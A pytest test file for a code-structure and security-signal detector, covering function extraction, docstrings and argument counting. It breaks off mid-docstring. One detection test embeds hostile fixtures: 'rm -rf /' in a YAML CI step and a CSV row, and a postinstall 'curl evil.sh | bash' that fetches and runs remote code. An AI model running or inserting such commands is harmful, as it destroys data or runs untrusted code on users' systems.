def test_detector_memory_alloc_no_cleanup():
    """Proves the AppSec sensor flags unmitigated memory allocations."""
    opt = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void leak_memory() {\n"
        "    void* ptr = malloc(100);\n"  # Trigger memory_alloc, but no free()
        "}\n"
    )
    result = opt.splice(code, "")

    # Verify the memory leak is registered and NOT mitigated
    assert result["equations"].get("memory_alloc", 0) == 1, "Failed to flag unmitigated memory allocation!"
    assert result["mitigation_telemetry"].get("mitigated_memory_allocs", 0) == 0, (
        "Falsely mitigated a true memory leak!"
    )


# ==============================================================================
# TEST 40: GHOST TETHER - HARVEST BELOW (PYTHON DOCSTRINGS)
# ==============================================================================
def test_detector_harvest_below_docstrings():
    """Proves the Ghost Tether correctly harvests comments sitting BELOW the definition (Python)."""
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = "def process_data():\n    '''\n    This is a python docstring below the def.\n    '''\n    pass\n"
    result = opt.splice(code, "", raw_content=code)

    assert len(result["functions"]) == 1
    docstring = result["functions"][0]["docstring"]
    assert "docstring below the def" in docstring, "Ghost Tether failed to harvest docstrings below the function!"
    # Regression guard for #246: the bare closing "'''" was previously
    # misclassified as an opening marker, letting the scan run past it
    # and swallow subsequent code into the docstring field.
    assert "pass" not in docstring, "Docstring extraction ran past the closing delimiter and swallowed code!"


# ==============================================================================
# TEST 41: SUCCESSFUL TIKTOKEN MASS CALCULATION
# ==============================================================================
def test_detector_tiktoken_mass_success():
    """Proves get_token_mass works when tiktoken is natively available."""
    from gitgalaxy.core.detector import get_token_mass

    # Mock the globals in detector.py to simulate a successful tiktoken import
    with patch("gitgalaxy.core.detector.HAS_TIKTOKEN", True):

        class MockEncoder:
            def encode(self, text, disallowed_special=()):
                return [1, 2, 3, 4, 5]  # Simulate 5 tokens

        with patch("gitgalaxy.core.detector.ENCODER", MockEncoder(), create=True):
            mass = get_token_mass("def mock_func(): pass")
            assert mass == 5, "Token mass calculation failed to use the encoder!"


# ==============================================================================
# TEST 42: METADATA DECODER EXCEPTION HANDLING
# ==============================================================================
def test_detector_metadata_decoder_exceptions(caplog):
    """Proves the metadata decoder survives malformed regex matches."""
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject a broken regex that crashes on .match()
    class ExplodingMatch:
        def match(self, text):
            raise ValueError("Metadata Match Crash")

    opt.primary_rules["_meta_purpose_line"] = ExplodingMatch()

    # The decoder should catch the ValueError and silently ignore the line
    meta = opt._decode_comment_stream("Purpose: This should crash but survive.")

    assert "purpose" not in meta, "Decoder somehow extracted purpose despite the crash!"
    assert meta["ownership"] == "Unknown Architect", "Decoder completely failed instead of continuing safely!"


# ==============================================================================
# TEST 43: SPATIAL MAPPER MISSING KEYS
# ==============================================================================
def test_spatial_mapper_missing_keys():
    """Proves the spatial mapper handles stars with missing path/filename keys."""
    mapper = SpatialMapper()

    # Provide a node with NO path and NO filename
    files = [{"file_impact": 100.0}]

    mapped = mapper.map_repository(files)

    assert len(mapped) == 1
    assert mapped[0]["directory_group"] == "__monolith__", "Failed to default missing paths to the monolith!"


# ==============================================================================
# TEST 44: APPSEC OOM BOMB (SPATIAL CASCADING FLUX)
# ==============================================================================
def test_detector_spatial_oom_bomb_correlation():
    """
    Proves the Spatial Map correctly amplifies State Flux when mutations
    occur within the blast radius of heavy algorithmic branching (OOM Bomb).
    """
    from gitgalaxy.core.detector import StructuralExtractor

    # 1. Happy Path: Mutation trapped inside a loop (Should Amplify)
    opt_oom = StructuralExtractor("python", MOCK_LANG_DEFS)
    # Inject temporary mock rules
    opt_oom.primary_rules["state_mutation"] = re.compile(r"global_list\.append")
    opt_oom.primary_rules["branch"] = re.compile(r"\bwhile\b")

    code_oom = (
        "def memory_leak():\n"
        "    while True:              # Trigger: branch\n"
        "        global_list.append(x) # Trigger: state_mutation (inside branch)\n"
    )
    res_oom = opt_oom.splice(code_oom, "")

    # A single state_mutation hit normally = 1.
    # The AppSec multiplier adds (cascading_flux * 2). Total should be >= 3.
    assert res_oom["equations"].get("state_mutation", 0) >= 3, (
        "Spatial correlation failed to amplify the OOM Bomb (Cascading Flux)!"
    )
    assert res_oom["mitigation_telemetry"].get("amplified_cascading_flux", 0) >= 1, (
        "Failed to log the OOM Bomb telemetry!"
    )

    # 2. Unhappy Path: Mutation far away from the loop (Should NOT Amplify)
    opt_safe = StructuralExtractor("python", MOCK_LANG_DEFS)
    opt_safe.primary_rules["state_mutation"] = re.compile(r"global_list\.append")
    opt_safe.primary_rules["branch"] = re.compile(r"\bwhile\b")

    # Put 200 lines of safe padding between them to exceed the 150-char blast radius
    padding = "    pass\n" * 200
    code_safe = (
        "def safe_mutation():\n"
        "    global_list.append(x) # Trigger: state_mutation\n"
        f"{padding}"
        "    while True:              # Trigger: branch (far away)\n"
        "        pass\n"
    )
    res_safe = opt_safe.splice(code_safe, "")

    # Because they are spatially separated, no amplification should occur. Total = 1.
    assert res_safe["equations"].get("state_mutation", 0) == 1, (
        "Spatial correlation falsely amplified an isolated state mutation!"
    )
    assert res_safe["mitigation_telemetry"].get("amplified_cascading_flux", 0) == 0, (
        "Falsely logged OOM Bomb telemetry on safe code!"
    )


# ==============================================================================
# TEST 45: ZERO-BRANCH MASSIVE STATE (OOM BOMB BYPASS)
# ==============================================================================
def test_detector_zero_branch_massive_state():
    """
    Proves that a file with massive state mutations but ZERO algorithmic branches
    safely bypasses the spatial OOM Bomb radar without throwing KeyErrors.
    """
    from gitgalaxy.core.detector import StructuralExtractor

    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject mock rules
    opt_detector.primary_rules["state_mutation"] = re.compile(r"global_list\.append")
    opt_detector.primary_rules["branch"] = re.compile(r"\b(while|for)\b")

    # Generate 100 state mutations with no loops
    mutations = "    global_list.append(x)\n" * 100
    code = f"def init_massive_data():\n{mutations}"

    result = opt_detector.splice(code, "")

    # The raw mutations should be counted, but the OOM Bomb telemetry must be exactly 0
    assert result["equations"].get("state_mutation", 0) == 100, (
        "Detector failed to count the raw, unamplified state mutations!"
    )
    assert result["mitigation_telemetry"].get("amplified_cascading_flux", 0) == 0, (
        "Detector falsely amplified an OOM Bomb in a file with no algorithmic loops!"
    )


# ==============================================================================
# TEST 46: EXACT LOC MAPPING (Offset to LOC)
# ==============================================================================
def test_detector_exact_loc_mapping():
    """Proves the coding_analysis phase accurately converts regex offsets to line numbers."""
    from gitgalaxy.core.detector import StructuralExtractor

    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject rules for testing
    opt_detector.primary_rules["sec_hardcoded_secrets"] = re.compile(r"password")
    opt_detector.primary_rules["high_risk_execution"] = re.compile(r"eval")

    code = (
        "def safe_func():\n"  # Line 1
        "    pass\n"  # Line 2
        "\n"  # Line 3
        "def bad_func():\n"  # Line 4
        "    x = 'password'\n"  # Line 5 (sec_hardcoded_secrets)
        "    eval(x)\n"  # Line 6 (high_risk_execution)
    )

    # Manually run coding analysis
    segments = [("python", code, 0)]
    counts, mitigations, spatial_maps, parents, threat_locations = opt_detector.coding_analysis(segments)

    # Verify the exact line numbers were captured
    assert "sec_hardcoded_secrets" in threat_locations, "Failed to map threat location!"
    assert threat_locations["sec_hardcoded_secrets"][0] == 5, (
        f"Expected line 5, got {threat_locations['sec_hardcoded_secrets'][0]}"
    )
    assert threat_locations["high_risk_execution"][0] == 6, "Failed to map subsequent line threat!"


# ==============================================================================
# TEST: DOCSTRING EXTRACTION STOPS AT A STAND-ALONE CLOSING """ (#246)
# ==============================================================================
def test_detector_docstring_stops_at_standalone_closing_triple_quote():
    """
    Regression test for #246: the exact PEP 257 shape from the bug report —
    opening \"\"\" alone, summary line, closing \"\"\" alone — must not let
    the scan run past the closing line into subsequent code.
    """
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = 'def foo():\n    """\n    Summary line.\n    """\n    return 1\n'
    result = opt.splice(code, "", raw_content=code)

    docstring = result["functions"][0]["docstring"]
    assert "Summary line." in docstring
    assert "return 1" not in docstring, "Docstring extraction swallowed the function body past the closing delimiter!"


def test_detector_single_line_docstring_still_terminates_correctly():
    """
    Regression guard for #246: confirms the len(nxt) > 3 single-line-docstring
    check still works correctly under the refactored state tracking — a
    docstring that opens AND closes on the same line must stop immediately
    and not bleed into the next line.
    """
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = 'def bar():\n    """Summary on one line."""\n    return 2\n'
    result = opt.splice(code, "", raw_content=code)

    docstring = result["functions"][0]["docstring"]
    assert "Summary on one line." in docstring
    assert "return 2" not in docstring


def test_detector_docstring_harvest_not_contaminated_by_harvest_above():
    """
    Regression guard for #246's underlying fix: if 'harvest above' (step 1)
    already populated doc_buffer before the below-docstring scan (step 2)
    begins, step 2's first line must still be evaluated as a potential
    OPENING line, not misclassified as a continuation of unrelated content.
    """
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = '# Architect: Ada Lovelace\ndef baz():\n    """\n    Summary line.\n    """\n    return 3\n'
    result = opt.splice(code, "", raw_content=code)

    docstring = result["functions"][0]["docstring"]
    assert "Summary line." in docstring
    assert "return 3" not in docstring, "Pre-existing 'harvest above' content contaminated the below-docstring scan!"


# ==============================================================================
# TEST 47: FALLBACK SIGNATURE ALIGNMENT (_slice_by_braces)
# ==============================================================================
@patch.object(StructuralExtractor, "_slice_by_braces")
def test_detector_fallback_slice_by_braces_arguments(mock_slice_by_braces):
    """
    Proves that the fallback paths in _slice_by_keywords and _slice_by_terminator
    pass the correct number of positional arguments (code, lang_id, rules, offset, spatial_map)
    to _slice_by_braces to prevent silent structural corruption.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # 1. Trigger Mode D's Fallback (Pass an unregistered language to force it to fail)
    opt_detector._slice_by_keywords(
        code="def test(): pass",
        lang_id="unregistered_alien_lang",
        rules={"mock": "rule"},
        offset=42,
        spatial_map={"branch": [10, 20]},
    )

    # Assert all 5 arguments were passed in the exact correct order
    mock_slice_by_braces.assert_called_with(
        "def test(): pass", "unregistered_alien_lang", {"mock": "rule"}, 42, {"branch": [10, 20]}
    )

    # Reset the mock for the next test
    mock_slice_by_braces.reset_mock()

    # 2. Trigger Mode E's Fallback
    opt_detector._slice_by_terminator(
        code="SELECT * FROM table;",
        lang_id="unregistered_sql_dialect",
        rules={"io": "rule"},
        offset=99,
        spatial_map={"io": [5]},
    )

    # Assert all 5 arguments were passed in the exact correct order
    mock_slice_by_braces.assert_called_with(
        "SELECT * FROM table;", "unregistered_sql_dialect", {"io": "rule"}, 99, {"io": [5]}
    )


# ==============================================================================
# TEST 48: MARKDOWN PROSE-DEFLECTION FIX -- COMMENT-STREAM SIGNATURE COUNTING (#691)
# ==============================================================================
def test_detector_markdown_routes_through_comment_analysis():
    """
    Regression test for #691: markdown's structural signatures (lit_code_blocks/
    lit_diagrams/lit_headers/lit_links) previously always counted zero, regardless
    of regex correctness, because the Prose Deflection gate returned an empty
    result before comment_analysis (the function that scans comment_stream) ever
    ran. Uses the REAL LANGUAGE_DEFINITIONS (not MOCK_LANG_DEFS) so this proves
    the actual production regexes fire, not just the wiring.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    # comment_stream is what prism.py's Prose Bypass actually produces for
    # markdown -- the entire file content, since markdown has no native
    # multi-line comment delimiter to strip. code_stream is always "".
    comment_stream = (
        "# Title\n\n"
        "Some prose with a [link](https://example.com) and another "
        "[Foo (bar)](https://en.wikipedia.org/wiki/Foo_(bar)).\n\n"
        "```python\nprint('hi')\n```\n\n"
        "```mermaid\ngraph TD;\n```\n\n"
        "## Section 2\n"
    )

    md_detector = StructuralExtractor("markdown", LANGUAGE_DEFINITIONS)
    result = md_detector.splice(code_stream="", comment_stream=comment_stream, confidence=1.0)

    assert result["equations"]["lit_headers"] == 2, "should count both '# Title' and '## Section 2'"
    assert result["equations"]["lit_links"] == 2, "should count both markdown links, including the paren-in-URL one"
    assert result["equations"]["lit_code_blocks"] == 4, "should count both fence pairs (python + mermaid)"
    assert result["equations"]["lit_diagrams"] == 1, "should count the mermaid fence"

    # Function/complexity analysis correctly still doesn't apply to prose.
    assert result["functions"] == []
    assert result["logic_density"] == 0.0
    assert result["total_control_flow_ratio"] == 0.0


def test_detector_markdown_empty_comment_stream_still_safe():
    """
    Edge case: an empty markdown file (empty comment_stream) must not error --
    comment_analysis's own `if not comment_stream: return counts` guard should
    short-circuit cleanly, same as it already does for every other language.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    md_detector = StructuralExtractor("markdown", LANGUAGE_DEFINITIONS)
    result = md_detector.splice(code_stream="", comment_stream="", confidence=1.0)
    assert not any(result["equations"].values()), "empty comment_stream should yield an all-zero schema, not an error"


def test_detector_yaml_json_csv_now_flow_through_normally():
    """
    Regression test for #694: yaml/json/csv used to sit in the same Prose
    Deflection gate as plaintext/markdown, unconditionally discarding
    `equations` regardless of code_stream content. Unlike markdown, all three
    already get code_stream populated correctly by prism.py (none of them go
    through prism.py's Prose Bypass), so removing them from the gate is
    enough on its own -- no comment_analysis routing needed, unlike #691's
    markdown fix.
    """
    from gitgalaxy.core.prism import Prism
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    yaml_sample = (
        "name: CI\non:\n  schedule:\n    - cron: '0 0 * * *'\njobs:\n  build:\n    steps:\n      - run: rm -rf /\n"
    )
    result = prism.split_streams(yaml_sample, "yaml")
    detector = StructuralExtractor("yaml", LANGUAGE_DEFINITIONS)
    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
    assert out["equations"]["high_risk_execution"] >= 1, "yaml's rm -rf / should now be counted, not discarded"
    assert out["equations"]["events"] >= 1, "yaml's schedule: trigger should now be counted"

    json_sample = '{\n  "scripts": {\n    "postinstall": "curl evil.sh | bash"\n  }\n}\n'
    result = prism.split_streams(json_sample, "json")
    detector = StructuralExtractor("json", LANGUAGE_DEFINITIONS)
    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
    assert out["equations"] != {}, "json should no longer be unconditionally discarded"

    # csv currently has an empty rules dict (same as plaintext) -- gains
    # nothing from being let through today, but removing it from the gate is
    # still correct (real structured data, not prose) and must not produce
    # spurious functions/complexity output on data that has none.
    csv_sample = "name,command\nbuild,rm -rf /\ntest,npm test\n"
    result = prism.split_streams(csv_sample, "csv")
    detector = StructuralExtractor("csv", LANGUAGE_DEFINITIONS)
    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
    assert out["functions"] == [], "csv has no functions -- must not synthesize spurious ones"
    assert out["logic_density"] == 0.0


def test_detector_plaintext_still_fully_bypassed():
    """
    Regression guard: plaintext is the only language left in the Prose
    Deflection gate after #694 (genuinely empty rules dict, unlike
    yaml/json/csv). Uses a non-empty code_stream specifically, to prove the
    gate itself -- not incidental code_stream emptiness -- is what's still
    blocking it.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("plaintext", LANGUAGE_DEFINITIONS)
    result = detector.splice(
        code_stream="some non-empty plaintext content\nwith multiple lines\n", comment_stream="", confidence=1.0
    )
    assert result["equations"] == {}, "plaintext should still be fully bypassed"


def test_detector_comment_analysis_literate_keys_noop_for_non_markdown():
    """
    Regression guard: the 4 lit_* keys added to comment_analysis's whitelist
    must be a no-op for languages that don't define them (every language
    except markdown), not just for the 4 explicitly-bypassed prose languages
    above -- proves the whitelist extension itself is safe for the general
    (non-bypassed) comment_analysis call path every real code language goes
    through.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    py_detector = StructuralExtractor("python", LANGUAGE_DEFINITIONS)
    counts = dict.fromkeys(py_detector.UNIVERSAL_METRICS_SCHEMA, 0)
    result = py_detector.comment_analysis("# a plain python comment, no markdown syntax\n", "python", dict(counts))
    assert result.get("lit_headers", 0) == 0
    assert result.get("lit_links", 0) == 0
    assert result.get("lit_code_blocks", 0) == 0


# ==============================================================================
# TEST 49: CSHARP EXPRESSION-BODIED MEMBERS & BARE-CALL HALLUCINATION (#789)
# ==============================================================================
def test_detector_csharp_expression_bodied_methods_now_counted():
    """
    Regression test for #789 using the issue's own example: unlike every
    other C-family language, csharp's func_start used to stop matching
    right at the opening `(`, deferring entirely to _slice_by_braces's
    post-hoc `{` search. Expression-bodied methods (idiomatic since C# 6)
    have no `{` at all, so they produced zero satellites before the fix.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("csharp", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["csharp"]["rules"]
    code = "public class Calc\n{\n    public int Square(int x) => x * x;\n    public int Cube(int x) => x * x * x;\n}\n"

    satellites, _ = detector._slice_by_braces(code, "csharp", rules, 0, {})
    names = [s["name"] for s in satellites]
    assert names == ["Square", "Cube"], f"expression-bodied methods should both be counted as functions: {names}"


def test_detector_csharp_bare_top_level_call_no_longer_hallucinated():
    """
    Regression test for #789 using the issue's own example: C# 9+
    top-level statements (the default `dotnet new console` template) have
    no enclosing brace. Before the fix, _slice_by_braces's bounded
    post-hoc brace search absorbed the first `{` it found downstream (the
    unrelated `if` block below), hallucinating a satellite named
    `Environment.Exit` whose body incorrectly spanned into that `if`
    block. func_start's new terminator lookahead now rejects a bare call
    statement outright (no `{` or `=>` follows it), so no satellite is
    produced at all.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("csharp", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["csharp"]["rules"]
    code = 'Console.WriteLine("Hello");\nEnvironment.Exit(0);\nif (args.Length > 0) {\n    Console.WriteLine(args[0]);\n}\n'

    satellites, _ = detector._slice_by_braces(code, "csharp", rules, 0, {})
    assert satellites == [], f"bare top-level call statements must not hallucinate a function: {satellites}"


def test_detector_csharp_mixed_block_and_expression_bodies():
    """
    A realistic class mixing a normal block-bodied method, an
    expression-bodied method, and a constructor with a `: base(...)`
    initializer -- all three must be counted, each with the correct body
    span (proving the constructor-initializer lookahead branch doesn't
    interfere with the existing brace-search path).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("csharp", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["csharp"]["rules"]
    code = (
        "public class Calc\n"
        "{\n"
        "    public int Add(int a, int b)\n"
        "    {\n"
        "        var result = a + b;\n"
        "        return result;\n"
        "    }\n"
        "\n"
        "    public int Square(int x) => x * x;\n"
        "\n"
        "    public Calc(int seed) : base()\n"
        "    {\n"
        "        Seed = seed;\n"
        "    }\n"
        "}\n"
    )
    satellites, _ = detector._slice_by_braces(code, "csharp", rules, 0, {})
    names = [s["name"] for s in satellites]
    assert names == ["Add", "Square", "Calc"], f"expected all 3 methods, got: {names}"


def test_detector_csharp_lambda_default_parameter_arrow_not_mistaken_for_body():
    """
    Regression guard for the fallback's own edge case: when an
    expression-bodied method has a lambda-typed default parameter that
    carries its OWN `=>`, the fallback must locate the method's real
    arrow (searched from after the parameter list's own closing paren),
    not the lambda default's arrow sitting inside the parameter list.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("csharp", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["csharp"]["rules"]
    code = "public int Foo(Func<int, int> f = null) => f(1);\n"

    satellites, _ = detector._slice_by_braces(code, "csharp", rules, 0, {})
    assert len(satellites) == 1
    assert satellites[0]["name"] == "Foo"
    # The block must span through to the REAL terminating `;`, not stop
    # short at some earlier point.
    assert "f(1)" in code[: code.index(";") + 1]


def test_detector_ts_js_braceless_arrow_capture():
    """
    #1629: typescript/javascript brace-less arrow functions
    (`const double = (x) => x * 2;`) are real functions and must be
    captured by _slice_by_braces, not dropped by the generic brace-only
    fallback. This replaced the old expectation (tested pre-#1629 in
    test_detector_csharp_expression_body_fallback_gated_to_csharp_only)
    that no non-csharp language may use an arrow fallback -- TS/JS now
    have their own next-match-bounded version of that handling, because
    brace-less expression bodies are their dominant export shape
    (88 of 159 corpus recall misses were this shape).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    for lang in ("typescript", "javascript"):
        detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
        rules = LANGUAGE_DEFINITIONS[lang]["rules"]
        code = "const double = (x) => x * 2;\n"

        satellites, _ = detector._slice_by_braces(code, lang, rules, 0, {})
        names = [s["name"] for s in satellites]
        assert names == ["double"], f"[{lang}] brace-less arrow not captured: {names}"


def test_detector_ts_js_braceless_arrow_capture_gated_from_other_mode_b_languages():
    """
    The #1629 brace-less arrow capture is deliberately gated to
    `lang_id in ("typescript", "javascript")` -- other Mode-B languages
    keep the generic brace-only fallback. Proves a Mode-B language without
    the gate still drops a brace-less arrow-shaped const rather than
    hallucinating a function from it.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    php_detector = StructuralExtractor("php", LANGUAGE_DEFINITIONS)
    php_rules = LANGUAGE_DEFINITIONS["php"]["rules"]
    code = "const double = (x) => x * 2;\n"

    satellites, _ = php_detector._slice_by_braces(code, "php", php_rules, 0, {})
    assert satellites == [], "the ts/js brace-less arrow capture must not fire for other Mode-B languages"


# ==============================================================================
# JAVASCRIPT/TYPESCRIPT STRING-LITERAL FALSE POSITIVE (epic #813, #814/#815)
# ==============================================================================
def test_detector_ts_js_ternary_branch_not_misattributed_as_function():
    """
    Regression test for issue #1632: the object-literal-method branch
    matches `IDENT :` followed by a function/arrow -- but a ternary's true
    branch (`cond ? name : function() { ... }`, jquery/deferred.js:182-184)
    has the identical `name :\nfunction() {` surface while `name` is a
    plain identifier reference, not an object key. The fix skips matches
    whose preceding non-whitespace char (bounded backward scan) is `?`.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    for lang in ("javascript", "typescript"):
        detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
        rules = LANGUAGE_DEFINITIONS[lang]["rules"]
        code = (
            "process = special ?\n"
            "    mightThrow :\n"
            "    function() {\n"
            "        try {\n"
            "            mightThrow();\n"
            "        } catch (e) {\n"
            "        }\n"
            "    };\n"
        )
        satellites, _ = detector._slice_by_braces(code, lang, rules, 0, {})
        names = [s["name"] for s in satellites]
        assert "mightThrow" not in names, f"[{lang}] ternary true-branch misattributed as a function: {names}"


def test_detector_js_ts_string_literal_no_longer_hallucinated_as_function():
    """
    Regression test for a real bug found while hardening the extraction
    gauntlets (epic #813): func_start used to be matched against the raw,
    unshielded `code` in _slice_by_braces, computed BEFORE the
    string/comment-shielded `safe_code` existed (safe_code was only built
    afterward, for the brace-search step). Since javascript's/typescript's
    func_start regex is `\\b`-anchored (not `^`-anchored), a single-line
    string literal containing function-shaped text false-positive-matched,
    e.g. `let query = "function Foo() {";`. Fixed by matching against
    `safe_code` instead for these two languages specifically.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    for lang in ("javascript", "typescript"):
        detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
        rules = LANGUAGE_DEFINITIONS[lang]["rules"]
        code = 'let query = "function Foo() {";\nconst realFn = () => {\n  return 1;\n};\n'

        satellites, _ = detector._slice_by_braces(code, lang, rules, 0, {})
        names = [s["name"] for s in satellites]
        assert names == ["realFn"], f"[{lang}] string-literal lookalike still hallucinated a function: {names}"


def test_detector_ts_param_function_type_annotation_not_counted_as_function():
    """
    Regression test for issue #1631: typescript's func_start
    colon-annotated-arrow branch cannot distinguish a real arrow-function
    property from a parameter's function-type annotation -- both are the
    same `IDENT: (...) => ...` surface syntax, but only the property has a
    runtime function. A nested parameter (`f: (a: A) => B` inside an
    interface member's own signature, e.g. fp-ts pipeable.ts's `f`/`g`
    phantoms) is always the first thing after an already-open parameter
    list, so its line is directly preceded by `(`; those line-anchored
    matches are now dropped in _slice_by_braces. An object-literal arrow
    property is never preceded by `(` (its enclosing `{` is), so it must
    still be counted.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    for lang in ("typescript", "javascript"):
        detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
        rules = LANGUAGE_DEFINITIONS[lang]["rules"]

        # fp-ts pipeable.ts shape: a generic function-type member whose
        # parameter list carries its own function-typed parameters.
        interface_code = (
            "export interface PipeableApply2<F extends URIS2> {\n"
            "  readonly chainFirst: <S, R, E, A, B>(\n"
            "    f: (a: A) => Kind4<F, S, R, E, B>\n"
            "  ) => (ma: Kind4<F, S, R, E, A>) => Kind4<F, S, R, E, A>\n"
            "}\n"
        )
        satellites, _ = detector._slice_by_braces(interface_code, lang, rules, 0, {})
        names = [s["name"] for s in satellites]
        assert "f" not in names, f"[{lang}] parameter annotation counted as a function: {names}"

        # The object-literal arrow property must still be counted: its line
        # is preceded by `{`/`,`, never `(`.
        object_code = "export const Either = {\n  URI,\n  ap: (fab, fa) => ({ fab, fa }),\n}\n"
        satellites2, _ = detector._slice_by_braces(object_code, lang, rules, 0, {})
        names2 = [s["name"] for s in satellites2]
        assert "ap" in names2, f"[{lang}] object-literal arrow property dropped: {names2}"


def test_detector_string_literal_fix_gated_away_from_other_mode_b_languages():
    """
    The safe_code-matching fix above is deliberately gated to
    `lang_id in ("javascript", "typescript")` only -- NOT applied broadly to
    every Mode-B (brace-slicing) language. Verifying it against the real
    crucible corpus surfaced a separate, pre-existing bug in prism.py's
    comment/string stripping for PHP (filed as #859): at least one real PHP
    corpus file's `code_stream` already has corrupted docblock/string
    content that confuses the same string/comment shielding step used here.
    That's currently harmless because the brace-search step's blast radius
    is naturally bounded -- but matching func_start's own positions against
    a corrupted safe_code (this fix's approach) would turn that latent
    corruption into wholesale loss of real functions for those files. This
    test locks in the gate so a future edit doesn't "simplify" this by
    removing the lang_id check before #859 is actually fixed.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    php_detector = StructuralExtractor("php", LANGUAGE_DEFINITIONS)
    php_rules = LANGUAGE_DEFINITIONS["php"]["rules"]
    # A php-shaped analogue of the same lookalike: if this language were
    # matched against safe_code, this would correctly resolve to zero
    # satellites (like javascript/typescript above) -- but the gate means
    # php still uses the raw-code path, so this just proves php's own
    # ordinary (already-existing) function detection is untouched by this
    # fix rather than asserting on the string-literal case directly (php's
    # own func_start is `^`-anchored, so it was never vulnerable to this
    # specific bug shape in the first place).
    code = "function realFn() {\n  return 1;\n}\n"
    satellites, _ = php_detector._slice_by_braces(code, "php", php_rules, 0, {})
    assert [s["name"] for s in satellites] == ["realFn"], "php's ordinary function detection regressed"


# ==============================================================================
# TEST 50: ARGS-COUNT CORRECTNESS (#1199 / #1209)
# ==============================================================================
# #1199 found that `function_data.args` was wrong for ~68% of Python's own
# correctly-found functions, root-caused to `_count_top_level_args`/
# `_calculate_block_metrics` falling back to whitespace-splitting the WHOLE
# regex match (e.g. "def name(...)") whenever a language's `args` rule had no
# capture group isolating just the parameter-list span. #1209 tracks porting
# the same capture-group fix to every other language with the same zero-
# capture-group precondition. Neither issue previously left behind a
# persisted regression test -- coverage was ad hoc verification only. These
# two test groups close that gap: the first pins the shared counting helper's
# behavior directly (language-agnostic), the second pins real per-language
# `args` regex + pipeline behavior for each language #1209 has fixed so far,
# so a future edit that reintroduces the whole-match fallback (or breaks a
# language's specific capture-group placement) fails a test instead of
# silently regressing.


def test_count_top_level_args_shared_helper():
    """
    Direct unit coverage for `_count_top_level_args`, the helper shared by
    every language's args-counting path. Covers every failure shape #1199
    found: empty parens, a trailing top-level comma (the near-universal
    `ruff format`/`rustfmt`/`gofmt` one-param-per-line style), Python's bare
    `*`/`/` keyword-/positional-only markers, and C's bare `void` empty-
    parameter-list marker -- plus that nested brackets/parens in a type hint
    or default value don't fool the top-level comma count.
    """
    detector = StructuralExtractor("python", {"python": {"rules": {}}})

    cases = [
        ("()", 0),
        ("(x)", 1),
        ("(x, y, z)", 3),
        ("(x, y,)", 2),  # trailing comma is a separator, not an extra arg
        ("(\n    x,\n    y,\n    z,\n)", 3),  # multi-line, one-per-line, trailing comma
        ("(a, *, b)", 2),  # bare "*" keyword-only marker isn't an argument
        ("(a, /, b)", 2),  # bare "/" positional-only marker isn't an argument
        ("(void)", 0),  # C's explicit empty-parameter-list marker
        ("(x: Dict[str, int], y)", 2),  # nested brackets don't split a single arg
        ("(x=foo(1, 2), y=3)", 2),  # nested parens in a default value
    ]
    for args_str, expected in cases:
        actual = detector._count_top_level_args(args_str)
        assert actual == expected, f"_count_top_level_args({args_str!r}) == {actual}, expected {expected}"


def test_count_top_level_args_angle_brackets_as_math_operators_1853():
    """
    #1853: `<`/`>` double as comparison/shift operators, not just generic-
    bracket delimiters. A default value using `<` as less-than permanently
    inflated depth (no matching `>` ever follows), hiding every later
    top-level comma; one using `>` as greater-than prematurely closed a
    bracket that was never open, exposing a nested comma as a false
    top-level separator. Python (no `<...>` generic syntax at all) is the
    ground-truth repro from the issue -- angle-bracket bracket-tracking is
    scoped to languages that actually use it, so Python's `<`/`>` here are
    ordinary operators, never brackets.
    """
    detector = StructuralExtractor("python", {"python": {"rules": {}}})
    assert detector._count_top_level_args("(a = (x < y), b = 2)") == 2, "less-than must not inflate depth"
    assert detector._count_top_level_args("(a = (x > y, z), b = 2)") == 2, "greater-than must not close early"


def test_count_top_level_args_angle_brackets_still_track_generics_for_generic_languages():
    """
    #1853's language gate must not regress the generic/template tracking it
